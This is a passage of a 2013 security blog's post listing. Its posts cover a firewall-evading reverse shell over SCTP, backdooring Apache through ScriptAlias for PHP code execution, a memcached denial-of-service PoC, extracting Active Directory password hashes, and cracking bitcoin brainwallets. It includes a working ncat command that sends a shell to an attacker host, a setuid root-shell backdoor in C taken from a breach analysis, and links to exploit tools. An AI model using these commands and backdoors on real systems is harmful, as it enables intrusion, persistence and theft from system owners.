						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=765" title="9:20 am" rel="bookmark"><time class="entry-date" datetime="2013-06-26T09:20:30+00:00">June 26, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=765#comments" title="Comment on SCTP Reverse Shell">6</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>So, over the last while I was looking at &#8220;Interesting&#8221; ways to throw back a reverse shell and remain under the radar a little bit. UDP, TCP and ICMP reverse shells have been done to death (heck, you can even use DNS tunneling), so I had the daft idea to try SCTP.</p>
<p>I noticed while testing it, many rubbish &#8220;Security in a box&#8221; firewalls do not actually parse SCTP packets at all, and just let them zip right through the firewall without checking their contents. So it looked like a perfect candidate for data exfiltration, spawning reverse shells, and other such mischief <img src="http://insecurety.net/wordpress/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>
<p>Anyway, at first I tested the idea out using ncat (from nmap), which features SCTP support and basically is a full replacement for netcat.</p>
<p>NOTE: SCTP support <em>should</em> be enabled by default on Linux. If it aint, do &#8220;modprobe sctp&#8221; and see does it work then. I found that OpenVZ virtual machines tend to <em>not </em>have SCTP support, depending on if it is supported on the host or not.</p>
<p>With ncat, doing the following is enough to deliver a reverse shell over SCTP.</p>
<p>rootedbox:~# ncat &#8211;sctp -c /bin/sh attackerip port</p>
<p>attacker:~# ncat &#8211;sctp -l -v -p port</p>
<p>Screenshot of this:</p>
<div id="attachment_918" style="width: 1376px" class="wp-caption aligncenter"><a href="http://insecurety.net/wordpress/wp-content/uploads/2013/06/2013-06-26-091102_1366x768_scrot.png" ><img class="size-full wp-image-918" alt="sctp reverse shell with netcat" src="http://insecurety.net/wordpress/wp-content/uploads/2013/06/2013-06-26-091102_1366x768_scrot.png" width="1366" height="768" /></a><p class="wp-caption-text">sctp reverse shell with netcat</p></div>
<p>So, we can do it with ncat, however I wanted to see how hard it would be to implement this in python.</p>
<p>Luckily, there is a python module for making SCTP connections &#8211; pysctp. It behaves very similarly to the socket module.</p>
<p>After a bit of playing around, I managed to implement a reverse shell over SCTP in python, which you can find here: <a href="http://packetstorm.igor.onlinedirect.bg/UNIX/penetration/rootkits/sctp_reverse.py.txt" onclick="javascript:_gaq.push(['_trackEvent','download','http://packetstorm.igor.onlinedirect.bg/UNIX/penetration/rootkits/sctp_reverse.py.txt']);">http://packetstorm.igor.onlinedirect.bg/UNIX/penetration/rootkits/sctp_reverse.py.txt</a></p>
<p>Screenshot:</p>
<div id="attachment_919" style="width: 1376px" class="wp-caption aligncenter"><a href="http://insecurety.net/wordpress/wp-content/uploads/2013/06/NOTYEKH.png" ><img class="size-full wp-image-919" alt="python sctp reverse shell" src="http://insecurety.net/wordpress/wp-content/uploads/2013/06/NOTYEKH.png" width="1366" height="768" /></a><p class="wp-caption-text">SCTP Reverse shell in python</p></div>
<p>Further development includes implementing SSL &#8211; it works, just tends to randomly die because pythons SSL library is rubbish, and writing these payloads in a native language (C) as opposed to python. Lots more to do here!</p>
<p>&nbsp;</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=99" title="View all posts in malware" rel="category">malware</a>, <a href="http://insecurety.net/?cat=24" title="View all posts in Networking" rel="category">Networking</a>, <a href="http://insecurety.net/?cat=23" title="View all posts in Packet-Fu" rel="category">Packet-Fu</a>, <a href="http://insecurety.net/?cat=45" title="View all posts in Python" rel="category">Python</a>, <a href="http://insecurety.net/?cat=11" title="View all posts in Security" rel="category">Security</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=egress-busting" rel="tag">egress busting</a>, <a href="http://insecurety.net/?tag=exfiltration" rel="tag">exfiltration</a>, <a href="http://insecurety.net/?tag=firewall-evasion" rel="tag">firewall evasion</a>, <a href="http://insecurety.net/?tag=ids-evasion" rel="tag">IDS evasion</a>, <a href="http://insecurety.net/?tag=ncat" rel="tag">ncat</a>, <a href="http://insecurety.net/?tag=networking-2" rel="tag">networking</a>, <a href="http://insecurety.net/?tag=penetration-testing" rel="tag">penetration testing</a>, <a href="http://insecurety.net/?tag=python-2" rel="tag">python</a>, <a href="http://insecurety.net/?tag=reverse-shells" rel="tag">reverse shells</a>, <a href="http://insecurety.net/?tag=sctp" rel="tag">SCTP</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=765#comments" title="Comment on SCTP Reverse Shell"><b>6</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-765 -->

				
					
	<article id="post-912" class="post-912 post type-post status-publish format-standard hentry category-exploit category-hack category-php category-python category-remote-code-execution category-routers-2 tag-admin tag-apache tag-exploit tag-hack tag-harmful tag-misconfigurations tag-php tag-python-2 tag-remote-code-execution tag-scriptalias">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=912" rel="bookmark">ScriptAlias, Backdooring Apache, and the Plesk Remote Code Execution Exploit. (Also a free 0day :P)</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=912" title="2:03 pm" rel="bookmark"><time class="entry-date" datetime="2013-06-06T14:03:03+00:00">June 6, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=912#comments" title="Comment on ScriptAlias, Backdooring Apache, and the Plesk Remote Code Execution Exploit. (Also a free 0day :P)">1</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>/* WARNING: This post is slightly &#8220;rambling&#8221; as it is written without my usual proofreading and checking over for errors due to being my &#8220;field notes&#8221; of sorts, and due to current affairs leading to incredible time constraints. For those looking for the &#8220;Free 0day&#8221; mentioned in the title, read <em>carefully </em> <img src="http://insecurety.net/wordpress/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />  */</p>
<p>So, while experimenting with kingcope&#8217;s shiny Plesk RCE exploit - <a href="http://seclists.org/fulldisclosure/2013/Jun/21" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://seclists.org']);">http://seclists.org/fulldisclosure/2013/Jun/21</a> - I decided to implement my own exploit for it in Python. Thanks to previously writing an exploit for the PHP-CGI vulnerability, this proved to be trivial.</p>
<p>The exploit is here: <a href="http://packetstormsecurity.com/files/122163/Plesk-PHP-Code-Injection.html" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://packetstormsecurity.com']);">http://packetstormsecurity.com/files/122163/Plesk-PHP-Code-Injection.html</a></p>
<p>Now, that is nice and all, but lets take a look at <em>why </em>this vulnerability occurs.</p>
<p>Basically, the Apache config shipped with the vulnerable versions of Plesk, contains the directive &#8216;ScriptAlias /phppath/ &#8220;/usr/bin/&#8221;&#8216;. This means that you can call any binary in the /usr/bin directory as a CGI script by passing it, and its arguments, in a URL, like so: host/phppath/php?-h</p>
<p>This allows you to directly call the PHP binary, have it executed as a CGI program, and the &#8220;-h&#8221; argument would be passed to it. What makes the exploit work, is we call the PHP binary and send it some arguments that allow us to send it PHP code to execute. You can, in fact, call *any* binary in /usr/bin/ and pass it args, the PHP interpreter being the easiest to abuse*</p>
<p>Basically, the vulnerability is caused by using the ScriptAlias directive to point at a directory, allowing one to call arbitrary binaries and use those to execute code.</p>
<p>Now, this is where it gets interesting.</p>
<p>I found it was trivial to &#8220;introduce&#8221; this vulnerability to an Apache webserver with one line, simply appending ScriptAlias /backdoor/ &#8220;/usr/bin/&#8221; to the httpd.conf file, or any file included by httpd.conf. This allows for a very sneaky PHP code execution backdoor to be &#8220;injected&#8221;, leaving no tell-tale files in the webroot, however, it does mean modifying a (often root owned) file. Still an interesting way to &#8220;add another way in&#8221;.</p>
<p>I then wondered if this line was a common thing to find in Apache config files, and if it could reliably allow remote code execution.</p>
<p>A few google queries later, and I was facedesking. And asking for a VPS to run some tests on.</p>
<p>First off, here is a well ranked guide on google for installing PHP in CGI mode on Ubuntu, which leads to a vulnerable configuration.<br />
<a href="http://www.binarytides.com/setup-apache-php-cgi-ubuntu/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://www.binarytides.com']);">http://www.binarytides.com/setup-apache-php-cgi-ubuntu/</a></p>
<p>Next, we have OpenWRT Wiki showing us how to set up PHP&#8230; And leave ourselves open for the pwning.<br />
<a href="http://wiki.openwrt.org/doc/howto/http.apache" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://wiki.openwrt.org']);">http://wiki.openwrt.org/doc/howto/http.apache</a></p>
<p>There were a few others, which I will leave locating up to the reader.</p>
<p>Anyway, there was enough hideous code to make me consider writing an exploit/remote testing utility in Python for this bug, which is in my github repo for exploits at <a href="https://github.com/infodox/exploits" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://github.com']);">https://github.com/infodox/exploits</a><br />
Running lolapache.py &lt;site&gt; will begin the process of probing and owning. Check out paths.txt, which contains the paths to probe for.</p>
<p>Demo:<br />
<iframe src="//www.youtube.com/embed/FfHLVp1TOeQ" height="315" width="560" allowfullscreen="" frameborder="0"></iframe></p>
<p>Anyways, now for the TL;DR: If you are gonna be using Apache, and ScriptAlias&#8217;ing PHP, you are gonna have a bad time.<br />
As for the free 0day, well. A whole load of boxes use these crappy configs, which means a whole load of boxes are ripe for getting owned by any moron with half a brain.</p>
<p>* I had a hit-and-miss series of tests passing an oneline reverse shell directly to Python interpreter and Perl interpreter, but it was unreliable. Some guys on rdot showed a method of using curl and python to pull down code and execute it.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=44" title="View all posts in Exploit" rel="category">Exploit</a>, <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=8" title="View all posts in PHP" rel="category">PHP</a>, <a href="http://insecurety.net/?cat=45" title="View all posts in Python" rel="category">Python</a>, <a href="http://insecurety.net/?cat=243" title="View all posts in Remote Code Execution" rel="category">Remote Code Execution</a>, <a href="http://insecurety.net/?cat=372" title="View all posts in Routers" rel="category">Routers</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=admin" rel="tag">admin</a>, <a href="http://insecurety.net/?tag=apache" rel="tag">Apache</a>, <a href="http://insecurety.net/?tag=exploit" rel="tag">Exploit</a>, <a href="http://insecurety.net/?tag=hack" rel="tag">Hack</a>, <a href="http://insecurety.net/?tag=harmful" rel="tag">harmful</a>, <a href="http://insecurety.net/?tag=misconfigurations" rel="tag">misconfigurations</a>, <a href="http://insecurety.net/?tag=php" rel="tag">PHP</a>, <a href="http://insecurety.net/?tag=python-2" rel="tag">python</a>, <a href="http://insecurety.net/?tag=remote-code-execution" rel="tag">Remote Code Execution</a>, <a href="http://insecurety.net/?tag=scriptalias" rel="tag">ScriptAlias</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=912#comments" title="Comment on ScriptAlias, Backdooring Apache, and the Plesk Remote Code Execution Exploit. (Also a free 0day :P)"><b>1</b> Reply</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-912 -->

				
					
	<article id="post-884" class="post-884 post type-post status-publish format-standard hentry category-cryptography category-hack category-passwords category-security tag-active-directory tag-lm tag-ntds tag-ntlm tag-pwdump">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=884" rel="bookmark">Active Directory Password Hash Extraction</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=884" title="11:33 am" rel="bookmark"><time class="entry-date" datetime="2013-05-05T11:33:40+00:00">May 5, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=3" title="View all posts by dietrich" rel="author">dietrich</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=884#comments" title="Comment on Active Directory Password Hash Extraction">5</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>Just added a tool for <strong>offline</strong> Active Directory password hash extraction.<br />
It has very basic functionality right now but much more is planned.</p>
<p>Command line application that runs on Windows only at the moment.<br />
<strong>
<pre>
  ntds_decode -s &lt;FILE&gt; -d &lt;FILE&gt; -m -i

    -s &lt;FILE&gt; : SYSTEM registry hive
    -d &lt;FILE&gt; : Active Directory database
    -m        : Machines (omitted by default)
    -i        : Inactive, Locked or Disabled accounts (omitted by default)</pre>
<p></strong></p>
<p>The SYSTEM registry hive and Active Directory database are from a domain controller.<br />
These files are obviously locked so you need to backup using the Volume Shadow Copy Service.</p>
<p>The output format is similar to pwdump and only runs on Windows at the moment.<br />
LM and NTLM hashes are extracted from active user accounts only.</p>
<p>ntds_decode mounts the SYSTEM file so Administrator access is required on the computer you run it on.</p>
<p>If you&#8217;re an experienced pen tester or Administrator that would like to test this tool, you can grab from <a href="http://www.insecurety.net/downloads/pwdtools/ntds_decode.zip" onclick="javascript:_gaq.push(['_trackEvent','download','http://www.insecurety.net/downloads/pwdtools/ntds_decode.zip']);">here</a></p>
<p>It&#8217;s advisable you don&#8217;t use the tool unless you know what you&#8217;re doing.<br />
Source isn&#8217;t provided at the moment because it&#8217;s too early to release.</p>
<p>If you have questions about it, feel free to e-mail the address provided in README.txt</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=374" title="View all posts in Cryptography" rel="category">Cryptography</a>, <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=213" title="View all posts in Passwords" rel="category">Passwords</a>, <a href="http://insecurety.net/?cat=11" title="View all posts in Security" rel="category">Security</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=active-directory" rel="tag">active directory</a>, <a href="http://insecurety.net/?tag=lm" rel="tag">lm</a>, <a href="http://insecurety.net/?tag=ntds" rel="tag">ntds</a>, <a href="http://insecurety.net/?tag=ntlm" rel="tag">ntlm</a>, <a href="http://insecurety.net/?tag=pwdump" rel="tag">pwdump</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=884#comments" title="Comment on Active Directory Password Hash Extraction"><b>5</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-884 -->

				
					
	<article id="post-877" class="post-877 post type-post status-publish format-standard hentry category-forensics category-hack category-passwords category-security tag-anikata tag-arrest tag-cambodia tag-hacking tag-legality tag-mainframes tag-opsec tag-programming tag-zos">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=877" rel="bookmark">A tale of two mainframes</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=877" title="8:31 pm" rel="bookmark"><time class="entry-date" datetime="2013-04-29T20:31:28+00:00">April 29, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=5" title="View all posts by March" rel="author">March</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=877#comments" title="Comment on A tale of two mainframes">5</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>Today, I acquired a copy of a report on <a title="anakata's" href="http://news.cnet.com/8301-1023_3-57510232-93/pirate-bays-warg-back-in-sweden-busted-on-hacking-charges/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://news.cnet.com']);">anakata&#8217;s</a> alleged hacking of Logica. You, too, can find a copy of it in PDF form <a title="here" href="http://minfil.se/Mfz0bfb3bc/bilaga_a.pdf" onclick="javascript:_gaq.push(['_trackEvent','download','http://minfil.se/Mfz0bfb3bc/bilaga_a.pdf']);">here</a>.<br />
There&#8217;s a number of interesting things in this report, and I figured I would take the time to disassemble them and give a little bit of analysis on each.</p>
<p>The first interesting thing, which starts on the bottom of page 36, is the vast number of IPs from which the attackers came from. Out of curiosity, I did a little investigation on the boxes involved in the attacks, the jumpboxes, if you will.<br />
Now, one of these is pretty interesting.<br />
124.248.187.225 and 27.109.118.33 are located in Cambodia. This implies that, if it WAS anakata, he presumably just compromised wireless routers in his area and used those to launch the attacks, or else was too lazy to protect himself.<br />
93.186.170.54 belongs to a VPS company.<br />
The others, bar one, are all residential ranges. I took a look at them, and nothing particularly struck my fancy about them, however, they did possess dreamboxes and/or some rather esoteric webservers, so my guess would be either default credentials or really, <strong>really</strong> bad code led to their compromises.<br />
Now, what grabs my attention is 202.120.189.223, and here is why:<br />
This was a z/OS mainframe belonging to Tongji University in China, one of the most respected universities in the country (although it is now offline). So, this brings the total number of hacked mainframes up to 3.</p>
<p>I&#8217;m just speculating here, but I would imagine that owing to the difficulty in transferring and working with files from UNIX to z/OS (even with Unix System Services and FTP), that Chinese mainframe probably existed as both storage for the tools used in the Logica hack, and as a development environment. I&#8217;m frankly very curious as to how, exactly, these mainframes were so easily broken into, but I have some suspicions.<br />
RACF, which is one of two competing &#8220;user management systems&#8221; for z/OS (the other being ACF2), has a number of interesting&#8230; quirks, including a limit on password length (8 characters), and the fact that the superuser account shipped by default cannot be completely removed; trying to attempt so may seem successful, but will result in it being quietly restored later. I have a few other theories, including the possibility of credential reuse and easily enumerated accounts (RACF conveniently tells you if a username doesn&#8217;t exist on the system), but unfortunately most of these aren&#8217;t concrete. Additionally, the main methods of egress seem to have been FTP and SSH, with little to no login failures reported, in which case it is worth assuming that the credentials may have been gathered from elsewhere, ie a compromised webserver.<br />
Anyway, as I said, this is just conjecture, and not solid facts.</p>
<p>Another interesting thing that is worth pointing out is the nature of the majority of the backdoor tools. Take a look at the following code:<br />
<code><br />
#include &lt;stdio.h&gt;<br />
#include &lt;unistd.h&gt;<br />
int main(int argc, char *argv[])<br />
{<br />
setuid(0);<br />
setgid(0);<br />
setgroups(0, NULL);<br />
execl("/bin/sh", "sh", NULL);<br />
}<br />
</code><br />
That&#8217;s incredibly, incredibly simple C. I&#8217;m not a C programmer, and even I could write that. But there&#8217;s a wonderful elegance about it. Why waste time with a tremendously technical backdoor tool when the simplest thing, a setuid wrapper for a shell, works just as well?<br />
That said, there are also far more technical and clever tools deployed, including one written in Z/arch HLasm. Dabbling in C, assembly, and other languages seems rather adventurous, so, with the warning that it&#8217;s just speculation, I&#8217;d imagine that this was a group of people familiar with mainframe development, not just one developer.<br />
The other tools, go.rx and kurwa, are interesting, too. Based on the strings shown from them, they&#8217;re probably rexx scripts (rexx is the equivalent of Perl on UNIX). If the giant /* REXX */ didn&#8217;t inform you. What is interesting is that they are apparently exploiting a previously unknown privilege escalation vulnerability, as well as adding yet another language to the list used.<br />
There are also less technical backdoors, for example, changing SSH keys to ensure access later, and altering inetd.conf to accomplish the same thing.</p>
<p>So, now that we&#8217;ve taken a look at this, I&#8217;d like to comment on what seems, to me, to be paradoxical and/or stupid.<br />
There are only two mainframes, yet a fairly bewildering range of techniques was deployed, with tools written in at least three different programming languages. This right here is terrible opsec, and a terrible waste. Adding multiple backdoors is risky, because you can&#8217;t gain MORE access; once you&#8217;ve got a backdoor in place you&#8217;ve got a backdoor, but you&#8217;re leaving more things around that a curious system administrator might stumble upon. As well as that, the more varied the tools and techniques, the more obvious it&#8217;s a large and diverse group. It would have been wiser to agree on a list of public tools and simple code that could have been easily ported to z/OS. It just seems weird that everyone was deploying their own toolkit; if these were made specifically for this attack, that&#8217;s quite an amount of time to spend.</p>
<p>Still, it&#8217;s a fascinating story. Mainframe security doesn&#8217;t get nearly enough coverage, and IBM&#8217;s z/OS has survived through a lack of scrutiny; security through obscurity.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=145" title="View all posts in forensics" rel="category">forensics</a>, <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=213" title="View all posts in Passwords" rel="category">Passwords</a>, <a href="http://insecurety.net/?cat=11" title="View all posts in Security" rel="category">Security</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=anikata" rel="tag">Anikata</a>, <a href="http://insecurety.net/?tag=arrest" rel="tag">arrest</a>, <a href="http://insecurety.net/?tag=cambodia" rel="tag">Cambodia</a>, <a href="http://insecurety.net/?tag=hacking" rel="tag">Hacking</a>, <a href="http://insecurety.net/?tag=legality" rel="tag">legality</a>, <a href="http://insecurety.net/?tag=mainframes" rel="tag">mainframes</a>, <a href="http://insecurety.net/?tag=opsec" rel="tag">OPSEC</a>, <a href="http://insecurety.net/?tag=programming" rel="tag">programming</a>, <a href="http://insecurety.net/?tag=zos" rel="tag">z/OS</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=877#comments" title="Comment on A tale of two mainframes"><b>5</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-877 -->

				
					
	<article id="post-872" class="post-872 post type-post status-publish format-standard hentry category-denial-of-service category-exploit category-hack category-idiots category-packet-fu category-python tag-cloud tag-denial-of-service tag-exploit tag-killthebox tag-memcached tag-python-2 tag-remote-exploit">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=872" rel="bookmark">Memcached Remote Denial of Service PoC</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=872" title="1:49 pm" rel="bookmark"><time class="entry-date" datetime="2013-04-29T13:49:44+00:00">April 29, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=872#comments" title="Comment on Memcached Remote Denial of Service PoC">4</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>A long time ago, in 2011, a rather serious vulnerability was reported in Memcached. It is now 2013, and the vulnerability still exists in the latest version on the memcached Google Code page.</p>
<p>The report is here: <a href="https://code.google.com/p/memcached/issues/detail?id=192" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://code.google.com']);">https://code.google.com/p/memcached/issues/detail?id=192</a></p>
<p>Now, as you can see, by sending a specially crafted packet, we can cause Memcached to segfault, and essentially die. Memcached is used by a lot of high profile sites to speed up page load times, and killing it would impact a bit on site performance, so I was rather curious as to why this bug had not yet been killed.</p>
<p>As you can see from the report, the vulnerability is trivial to exploit. Just send the magic packet of death and it kills the memcached service. I tried to get remote code execution from it, but had no luck at all. Perhaps one of you might have more luck!</p>
<div id="attachment_873" style="width: 1376px" class="wp-caption aligncenter"><a href="http://insecurety.net/wordpress/wp-content/uploads/2013/04/2013-04-29-135036_1366x768_scrot.png" ><img class="size-full wp-image-873" alt="memcached dead" src="http://insecurety.net/wordpress/wp-content/uploads/2013/04/2013-04-29-135036_1366x768_scrot.png" width="1366" height="768" /></a><p class="wp-caption-text">memcached ded</p></div>
<p>Exploit code available to download here: <a href="http://insecurety.net/wordpress/wp-content/uploads/2013/04/killthebox.py_.txt" onclick="javascript:_gaq.push(['_trackEvent','download','http://insecurety.net/wordpress/wp-content/uploads/2013/04/killthebox.py_.txt']);">killthebox.py</a></p>
<p>As always, responsible use is encouraged. Killing $(big website) memcached might get you in trouble, so don&#8217;t do it.</p>
<p>As for the memcached devs: You have known about this for two bloody years and never fixed it. This is terribly irresponsible of you. Fix it.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=9" title="View all posts in Denial of Service" rel="category">Denial of Service</a>, <a href="http://insecurety.net/?cat=44" title="View all posts in Exploit" rel="category">Exploit</a>, <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=6" title="View all posts in Idiots" rel="category">Idiots</a>, <a href="http://insecurety.net/?cat=23" title="View all posts in Packet-Fu" rel="category">Packet-Fu</a>, <a href="http://insecurety.net/?cat=45" title="View all posts in Python" rel="category">Python</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=cloud" rel="tag">cloud</a>, <a href="http://insecurety.net/?tag=denial-of-service" rel="tag">Denial of Service</a>, <a href="http://insecurety.net/?tag=exploit" rel="tag">Exploit</a>, <a href="http://insecurety.net/?tag=killthebox" rel="tag">killthebox</a>, <a href="http://insecurety.net/?tag=memcached" rel="tag">memcached</a>, <a href="http://insecurety.net/?tag=python-2" rel="tag">python</a>, <a href="http://insecurety.net/?tag=remote-exploit" rel="tag">remote exploit</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=872#comments" title="Comment on Memcached Remote Denial of Service PoC"><b>4</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-872 -->

				
					
	<article id="post-866" class="post-866 post type-post status-publish format-standard hentry category-algorithms category-cryptography category-exploit category-idiots category-python tag-bitcoin tag-bitcoin-hijacking tag-bitcoin-theft tag-blatant-theft tag-crypto tag-implementation tag-passphrases tag-passwords-2 tag-sha256">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=866" rel="bookmark">Bitcoin &#8220;Brainwallets&#8221; and why they are a bad idea</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=866" title="6:01 pm" rel="bookmark"><time class="entry-date" datetime="2013-03-26T18:01:26+00:00">March 26, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=866#comments" title="Comment on Bitcoin &#8220;Brainwallets&#8221; and why they are a bad idea">13</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>// Decided to publish this after some misgivings about disclosure. After telling Asher about it earlier, it was decided to disclose it to make people aware of the issue.</p>
<p>A week or two ago, I stumbled across an article about how these &#8220;Brainwallet&#8221; things were making your bitcoins &#8220;Deniable&#8221;, as no &#8220;wallet&#8221; exists except in your head.</p>
<p>How they work is quite simple: you take a passphrase, and that is to be the super secret key for your &#8220;wallet&#8221;. So long as you remember that passphrase, you can access the wallet.</p>
<p>This passphrase is hashed with SHA256 to form the private key for your wallet, so you can generate your privkey at will. The privkey is turned into a bitcoin address using the standard algorithm.</p>
<p>Now, so long as you know the private key, you own that wallet. So if you know the passphrase, you know the private key. This is essentially basing the private key on insecure (user supplied as opposed to random) data, normally a word or string of words (everyone sucks at passphrases).</p>
<p>Now, how do we go about attacking this. Well, think of it as the same as cracking peoples passwords.</p>
<p>You take a dictionary of likely looking passphrases, and hash &#8216;em with SHA-256 to make a bunch of private keys. You then convert them to wallet-import format using the Base58 encoding that Bitcoin uses, and pass the WIF string to bitcoind to import the wallet. If anyone was using that private key/passphrase, all their bitcoin now belongs to you.</p>
<p>Being a lovely person, I wrote up a proof of concept based on brainwallet.py (a brainwallet generator) that automatically does all this. My code is terrible, but it proves the point I was trying to make. A better written piece of code could import thousands of keys incredibly quickly, exhausting entire blocks of passphrase-keyspace.</p>
<p><a href="http://pastie.org/pastes/7123606/text?key=hkkjdwy70fpl4doquq7nhg" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://pastie.org']);">Proof of Concept</a></p>
<p>The brainwallet.py implementation I hacked into the above can be gotten here: <a href="https://github.com/willwharton/pybrainwallet/blob/master/brainwallet.py" onclick="javascript:_gaq.push(['_trackEvent','download','http://github.com/willwharton/pybrainwallet/blob/master/brainwallet.py']);">Brainwallet.py</a></p>
<p>The terrifying thing about this is, you are not only stealing &#8220;current&#8221; bitcoins, but also future ones. If anyone ever uses any of the passphrases you have &#8220;pwned&#8221;, you own their bitcoins.</p>
<p>So, tell your friends: Brainwallets are dumb.</p>
<p>-infodox</p>
<p>p.s.: we now accept bitcoin if you ever feel like buying us a beer. 1MJ6KnLdXm82UjdDuvgjxDhngLjBMJfamV</p>
<p>NOTE: We do not encourage or approve of stealing peoples money. It is a bad idea.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
